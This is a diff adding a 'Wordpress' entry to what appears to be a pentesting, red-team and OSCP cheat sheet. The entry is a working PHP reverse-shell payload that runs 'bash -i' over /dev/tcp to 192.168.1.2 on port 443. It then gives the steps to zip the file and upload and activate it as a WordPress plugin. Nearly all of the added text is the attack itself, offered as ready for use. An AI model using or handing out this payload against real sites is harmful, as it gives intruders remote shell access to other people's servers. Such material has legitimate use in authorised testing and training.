@@ -75,6 +75,29 @@ __Pentesting - Red Team - CTFs - OSCP__
   ```
   ---
   
+  `Wordpress`
+
+  ```cmd
+  root@kali:~# nano reverse.php
+  ```
+  ```php
+  <?php
+  exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.2/443 0>&1'");
+  ?>
+  ```cmd
+  root@kali:~# zip reverse.zip reverse.php
+  ```
+  [Plugins]
+  
+  [Add New]
+  
+  [Upload Plugin]
+  
+  [Install Now]
+  
+  [Activate PLugin]
+  ---
+  
 `Perl`
 
   ```cmd
